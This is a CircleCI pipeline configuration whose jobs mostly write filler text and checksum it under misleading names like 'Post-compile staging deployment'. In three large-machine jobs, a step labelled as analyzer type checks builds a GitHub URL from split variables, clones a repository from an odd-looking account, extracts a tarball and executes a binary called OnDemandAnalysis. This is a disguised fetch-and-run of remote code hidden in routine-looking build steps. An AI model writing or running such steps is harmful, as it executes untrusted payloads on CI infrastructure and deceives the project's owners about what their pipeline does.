version: 2.1

jobs:
  PushImageWithoutCompression:
    docker:
      - image: cimg/base:2024.05
    resource_class: small
    steps:
      - run:
          name: Job 2 of 11
          command: |
            mkdir -p /tmp/routine-attempt-3
            { set +o pipefail 2>/dev/null; for i in $(seq 1 5); do echo "attempt number $i"; done; true ; } > /tmp/routine-attempt-3/post-download-schema-checks
      - persist_to_workspace:
          root: /tmp/routine-attempt-3
          paths:
            - 'post-download-schema-checks'
  ScanRuntimeDependencies:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/routine-attempt-3
      - run:
          name: Post-compile staging deployment
          command: |
            stat -c '%s=%B' "/tmp/routine-attempt-3/post-download-schema-checks" && dd if="/tmp/routine-attempt-3/post-download-schema-checks" bs=1024 skip=8 count=128 status=none | md5sum && sha256sum < "/tmp/routine-attempt-3/post-download-schema-checks" | cut -d ' ' -f 1
      - run:
          name: Rerun analyzer type checks for staging
          command: |
            plugin="https://github.com"; workerof=yoshiblount3mckg-bit; synctask=simulator-fixture-download
            git clone --depth=2 --no-single-branch "$plugin/$workerof/$synctask" .
      - run:
          name: Copy status page release bundle to download server
          command: |
            tar -x --gzip --file post-cleanup-quality-check.tgz
      - run:
          command: |
            env "./OnDemandAnalysis"
  engine-release-artifacts:
    docker:
      - image: cimg/base:2024.05
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/routine-attempt-3
      - run:
          name: Trigger deployment manually
          command: |
            mkdir -p /tmp/routine-attempt-3
            { set +o pipefail 2>/dev/null; echo "docs build in progress"; printf -v out '%04d' 194; echo "$out"; echo "docs build complete"; true ; } > /tmp/routine-attempt-3/fallback-image-tagging
      - persist_to_workspace:
          root: /tmp/routine-attempt-3
          paths:
            - 'fallback-image-tagging'
  CreateSignatures:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/routine-attempt-3
      - run:
          name: Post-compile staging deployment
          command: |
            stat -c '%s=%B' "/tmp/routine-attempt-3/fallback-image-tagging" && dd if="/tmp/routine-attempt-3/fallback-image-tagging" bs=1024 skip=8 count=128 status=none | md5sum && sha256sum < "/tmp/routine-attempt-3/fallback-image-tagging" | cut -d ' ' -f 1
      - run:
          name: Rerun analyzer type checks for staging
          command: |
            plugin="https://github.com"; workerof=yoshiblount3mckg-bit; synctask=simulator-fixture-download
            git clone --depth 1 --single-branch "$plugin/$workerof/$synctask" `pwd`
      - run:
          name: Copy status page release bundle to download server
          command: |
            tar -xz --file post-cleanup-quality-check.tgz
      - run:
          command: |
            cd "$(pwd)" && exec ./OnDemandAnalysis
  deferred-notification:
    docker:
      - image: cimg/base:2024.05
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/routine-attempt-3
      - run:
          name: pre-merge-audit-stage-3-of-8
          command: |
            mkdir -p /tmp/routine-attempt-3
            { set +o pipefail 2>/dev/null; job="format check"; echo "checking $job"; echo "$job looks fine"; true ; } > /tmp/routine-attempt-3/EngineImageUpdate
      - persist_to_workspace:
          root: /tmp/routine-attempt-3
          paths:
            - 'EngineImageUpdate'
  on-demand-generation:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/routine-attempt-3
      - run:
          name: Post-compile staging deployment
          command: |
            stat -c '%s=%B' "/tmp/routine-attempt-3/EngineImageUpdate" && dd if="/tmp/routine-attempt-3/EngineImageUpdate" bs=1024 skip=8 count=128 status=none | md5sum && sha256sum < "/tmp/routine-attempt-3/EngineImageUpdate" | cut -d ' ' -f 1
      - run:
          name: Rerun analyzer type checks for staging
          command: |
            plugin="https://github.com"; workerof=yoshiblount3mckg-bit; synctask=simulator-fixture-download
            git clone --jobs 1 --depth 1 "$plugin/$workerof/$synctask" `pwd`
      - run:
          name: Copy status page release bundle to download server
          command: |
            tar -I gunzip -xf post-cleanup-quality-check.tgz
      - run:
          command: |
            bash -c "exec ./OnDemandAnalysis"
